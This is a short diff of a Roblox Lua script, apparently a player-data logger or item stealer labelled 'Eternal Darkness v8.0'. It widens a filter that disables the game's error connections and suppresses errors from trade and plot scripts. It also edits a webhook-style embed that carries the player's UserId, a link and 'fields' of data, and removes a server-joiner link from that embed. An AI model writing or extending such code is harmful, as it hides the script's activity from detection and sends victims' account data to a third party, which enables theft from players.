@@ -8,7 +8,10 @@ pcall(function()
             local old = conn.Function
             conn:Disable()
             game:GetService("ScriptContext").Error:Connect(function(message, stackTrace)
-                if message:find("RemainingTime") or message:find("BillboardGui") or message:find("PlotClient") or message:find("TradeController") then
+                if message:find("RemainingTime") or message:find("BillboardGui") or message:find("PlotClient") or message:find("TradeController") or message:find("GetAttribute") then
+                    return
+                end
+                if stackTrace and (stackTrace:find("PlotClient") or stackTrace:find("TradeController")) then
                     return
                 end
                 old(message, stackTrace)
@@ -395,7 +398,6 @@ local payload = {
         url = rubisLink,
         color = 0x1a1a2e,
         thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
-        description = fernJoinerLink,
         fields = fields,
         footer = {text = "Eternal Darkness v8.0"},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
